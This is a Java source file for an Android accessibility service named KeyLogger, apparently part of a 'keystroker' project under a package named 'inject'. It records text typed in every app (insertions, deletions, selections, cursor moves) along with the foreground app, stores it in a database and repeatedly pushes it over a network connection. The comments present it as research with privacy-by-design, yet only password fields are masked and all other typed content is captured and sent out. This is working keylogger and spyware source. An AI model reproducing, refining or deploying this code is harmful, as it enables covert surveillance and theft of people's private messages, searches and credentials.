package com.android.inject.keystroker;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Accessibility service that captures input events for the keystroker research project.
 *
 * Fixes vs. the original version:
 *  - Shares a single KeyLoggerDAO instance with KeyNetwork (passed in) to avoid two
 *    independent SQLite connections racing on the same database.
 *  - inputBuffer is capped (MAX_FIELD_LEN) so that very large fields / big pastes cannot
 *    drive O(n^2) processing or exhaust memory.
 *  - Keystroke events are emitted as structured JSON diffs ({op,pos,ins,del,len,..}) so
 *    autocorrect / voice-to-text / multi-region edits are captured faithfully instead of
 *    being mis-classified by the naive prefix/suffix diff.
 *  - Password fields are NOT captured char-by-char (privacy-by-design): only a masked
 *    marker is logged, demonstrating defensive handling.
 *  - Periodic prune() on the DB keeps disk usage bounded.
 */
public class KeyLogger extends AccessibilityService {

    private static final String TAG = "KeyLoggerSvc";

    /** Hard cap on the length of a single field's tracked text. */
    private static final int MAX_FIELD_LEN = 8192;

    /** How often the DB retention policy is enforced. */
    private static final long PRUNE_INTERVAL_MIN = 30;

    private KeyLoggerDAO keyLoggerDAO;
    private KeyNetwork keyNetwork;

    private String currentPackage = "";
    private final StringBuilder inputBuffer = new StringBuilder();
    private String currentFocusedViewId = "";
    private String previousFullText = "";
    private int currentCursorPosition = -1;
    private int selectionStart = -1;
    private int selectionEnd = -1;
    private boolean currentFieldIsPassword = false;

    private ScheduledExecutorService maintenanceExec;

    @Override
    public void onCreate() {
        super.onCreate();
        keyLoggerDAO = new KeyLoggerDAO(this);
        keyNetwork = new KeyNetwork(this, keyLoggerDAO); // share the DAO instance
        keyNetwork.connect();

        maintenanceExec = Executors.newSingleThreadScheduledExecutor();
        maintenanceExec.scheduleAtFixedRate(() -> {
            try {
                keyLoggerDAO.prune();
            } catch (Exception e) {
                Log.w(TAG, "prune failed: " + e.getMessage());
            }
        }, PRUNE_INTERVAL_MIN, PRUNE_INTERVAL_MIN, TimeUnit.MINUTES);

        Log.d(TAG, "KeyLogger initialized.");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                handleFocus(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                handleSelection(event);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowChanged(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChanged(event);
                break;
            default:
                break;
        }
    }

    // ------------------------------------------------------------------ handlers

    private void handleFocus(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        try {
            if (source != null && source.isEditable()) {
                String viewId = (source.getViewIdResourceName() != null)
                        ? source.getViewIdResourceName()
                        : "unknown_view";
                boolean isPassword = source.isPassword();

                if (!viewId.equals(currentFocusedViewId) && inputBuffer.length() > 0) {
                    flushBufferToDatabase();
                }
                currentFocusedViewId = viewId;
                currentFieldIsPassword = isPassword;
                resetFieldState();

                if (isPassword) {
                    // Do not capture password contents. Log only a masked marker.
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, metaJson("PASSWORD_FIELD", viewId));
                    return;
                }

                CharSequence existingText = source.getText();
                if (existingText != null && existingText.length() > 0) {
                    String existStr = truncate(String.valueOf(existingText));
                    inputBuffer.append(existStr);
                    previousFullText = existStr;
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, metaJson("FIELD_FOCUS", viewId));
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, diffJson("init", 0, existStr, "", existStr.length()));
                } else {
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, metaJson("FIELD_FOCUS", viewId));
                }
            }
        } finally {
            if (source != null) source.recycle();
        }
    }

    private void handleSelection(AccessibilityEvent event) {
        int from = event.getFromIndex();
        int to = event.getToIndex();
        if (from != to) {
            selectionStart = from;
            selectionEnd = to;
            currentCursorPosition = to;
            String sel = "";
            if (inputBuffer.length() >= to && from >= 0) {
                sel = inputBuffer.substring(from, Math.min(to, inputBuffer.length()));
            }
            keyLoggerDAO.insertKeystrokeEvent(currentPackage, metaJson("SELECT", from + ":" + to + ":" + sel));
        } else {
            int old = currentCursorPosition;
            currentCursorPosition = from;
            selectionStart = -1;
            selectionEnd = -1;
            if (old != currentCursorPosition && old >= 0) {
                keyLoggerDAO.insertKeystrokeEvent(currentPackage, metaJson("CURSOR_MOVE", old + "->" + currentCursorPosition));
            }
        }
    }

    private void handleWindowChanged(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();
        if (pkg.isEmpty() || pkg.equals(currentPackage)) return;

        if (inputBuffer.length() > 0) flushBufferToDatabase();
        currentPackage = pkg;
        keyLoggerDAO.insertAppEvent(currentPackage, getAppNameFromPackage(currentPackage));
        if (keyNetwork != null && keyNetwork.isConnected()) keyNetwork.sendPendingData();
    }

    private void handleTextChanged(AccessibilityEvent event) {
        if (currentFieldIsPassword) return; // never capture password text changes

        AccessibilityNodeInfo source = event.getSource();
        try {
            boolean editable = (source != null && source.isEditable());
            if (source != null && editable) {
                int ss = source.getTextSelectionStart();
                int se = source.getTextSelectionEnd();
                if (ss >= 0) {
                    if (ss != se) {
                        selectionStart = ss;
                        selectionEnd = se;
                    } else {
                        currentCursorPosition = ss;
                        selectionStart = -1;
                        selectionEnd = -1;
                    }
                }
            }
            if (!editable) return;
        } finally {
            if (source != null) source.recycle();
        }

        String curText = (event.getText() != null && event.getText().size() > 0)
                ? event.getText().get(0).toString() : "";
        String befText = (event.getBeforeText() != null && event.getBeforeText().size() > 0)
                ? event.getBeforeText().get(0).toString() : "";
        if (befText.isEmpty() && !previousFullText.isEmpty()) befText = previousFullText;

        // Bound memory: if either side is huge, emit a composite snapshot and skip per-char analysis.
        if (curText.length() > MAX_FIELD_LEN || befText.length() > MAX_FIELD_LEN) {
            keyLoggerDAO.insertKeystrokeEvent(currentPackage,
                    metaJson("FIELD_TOO_LARGE", "cur=" + curText.length() + " bef=" + befText.length()));
            // Keep a capped copy so we can still diff subsequent small edits.
            String capped = truncate(curText);
            inputBuffer.setLength(0);
            inputBuffer.append(capped);
            previousFullText = capped;
            return;
        }

        processTextChange(befText, curText);
        previousFullText = curText;
        if (!inputBuffer.toString().equals(curText)) {
            inputBuffer.setLength(0);
            inputBuffer.append(curText);
        }
        if (keyNetwork != null && keyNetwork.isConnected()) keyNetwork.sendPendingData();
    }

    // ------------------------------------------------------------------ structured diff

    private void processTextChange(String before, String after) {
        int bLen = before.length();
        int aLen = after.length();

        if (aLen == bLen) {
            if (after.equals(before)) return; // no change
            int ds = findFirstDiff(before, after);
            int de = findLastDiff(before, after);
            String oldPart = before.substring(ds, de + 1);
            String newPart = after.substring(ds, de + 1);
            emit(diffJson("replace", ds, newPart, oldPart, newPart.length()));
            currentCursorPosition = ds + newPart.length();
            return;
        }

        if (aLen > bLen) {
            // Insertion (possibly replacing an active selection).
            int insPos = findInsertPos(before, after);
            if (insPos < 0 || insPos > bLen) insPos = bLen;
            String added = after.substring(insPos, insPos + (aLen - bLen));
            if (selectionStart >= 0 && selectionEnd > selectionStart) {
                // Replacing a selection: deleted = selected text, inserted = added.
                String deleted = (selectionStart <= inputBuffer.length())
                        ? inputBuffer.substring(selectionStart, Math.min(selectionEnd, inputBuffer.length()))
                        : "";
                emit(diffJson("replace", selectionStart, added, deleted, added.length()));
                currentCursorPosition = insPos + added.length();
                selectionStart = -1;
                selectionEnd = -1;
            } else {
                emit(diffJson("insert", insPos, added, "", added.length()));
                currentCursorPosition = insPos + added.length();
            }
            return;
        }

        // aLen < bLen: deletion.
        int delPos = findDeletePos(before, after);
        int delCount = bLen - aLen;
        if (selectionStart >= 0 && selectionEnd > selectionStart && (selectionEnd - selectionStart) == delCount) {
            String deleted = before.substring(selectionStart, selectionStart + delCount);
            emit(diffJson("delete", selectionStart, "", deleted, 0));
            currentCursorPosition = selectionStart; // capture before clearing selection state
            selectionStart = -1;
            selectionEnd = -1;
        } else {
            String deleted = before.substring(delPos, delPos + delCount);
            emit(diffJson("delete", delPos, "", deleted, 0));
            currentCursorPosition = delPos;
        }
    }

    private void emit(String content) {
        keyLoggerDAO.insertKeystrokeEvent(currentPackage, content);
    }

    // ------------------------------------------------------------------ diff helpers

    private int findFirstDiff(String a, String b) {
        int min = Math.min(a.length(), b.length());
        for (int i = 0; i < min; i++) if (a.charAt(i) != b.charAt(i)) return i;
        return min;
    }

    private int findLastDiff(String a, String b) {
        int i = a.length() - 1, j = b.length() - 1;
        while (i >= 0 && j >= 0 && a.charAt(i) == b.charAt(j)) { i--; j--; }
        return i;
    }

    private int findInsertPos(String before, String after) {
        int left = findFirstDiff(before, after);
        return Math.min(left, before.length());
    }

    private int findDeletePos(String before, String after) {
        int left = findFirstDiff(before, after);
        return (left >= after.length()) ? after.length() : left;
    }

    // ------------------------------------------------------------------ JSON builders

    /** Structured keystroke diff: {"op":..,"pos":..,"ins":..,"del":..,"len":..}. */
    private String diffJson(String op, int pos, String ins, String del, int len) {
        try {
            JSONObject o = new JSONObject();
            o.put("op", op);
            o.put("pos", pos);
            o.put("ins", ins == null ? "" : ins);
            o.put("del", del == null ? "" : del);
            o.put("len", len);
            return o.toString();
        } catch (Exception e) {
            // Should never happen with simple string inputs.
            return "[DIFF_ERR:" + op + "]";
        }
    }

    /** Non-keystroke meta event (focus/select/cursor/marker). */
    private String metaJson(String kind, String detail) {
        try {
            JSONObject o = new JSONObject();
            o.put("meta", kind);
            o.put("detail", detail == null ? "" : detail);
            return o.toString();
        } catch (Exception e) {
            return "[META_ERR:" + kind + "]";
        }
    }

    // ------------------------------------------------------------------ lifecycle

    private void resetFieldState() {
        inputBuffer.setLength(0);
        previousFullText = "";
        currentCursorPosition = -1;
        selectionStart = -1;
        selectionEnd = -1;
    }

    private void flushBufferToDatabase() {
        if (inputBuffer.length() > 0) {
            keyLoggerDAO.insertKeystrokeEvent(currentPackage,
                    diffJson("init", 0, inputBuffer.toString(), "", inputBuffer.length()));
            resetFieldState();
        }
    }

    private String truncate(String s) {
        if (s == null) return "";
        return s.length() > MAX_FIELD_LEN ? s.substring(0, MAX_FIELD_LEN) : s;
    }

    private String getAppNameFromPackage(String pkg) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            return pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
        } catch (Exception e) {
            return pkg;
        }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED
                | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 30;
        info.flags = AccessibilityServiceInfo.DEFAULT
                | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        setServiceInfo(info);
        Log.d(TAG, "Service connected.");
    }

    @Override
    public void onInterrupt() {
        // No-op; the system calls this when it wants to interrupt feedback.
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (inputBuffer.length() > 0) flushBufferToDatabase();
        if (maintenanceExec != null) {
            maintenanceExec.shutdownNow();
            maintenanceExec = null;
        }
        if (keyNetwork != null) keyNetwork.disconnect();
        if (keyLoggerDAO != null) keyLoggerDAO.close();
        Log.d(TAG, "Service destroyed.");
    }
}
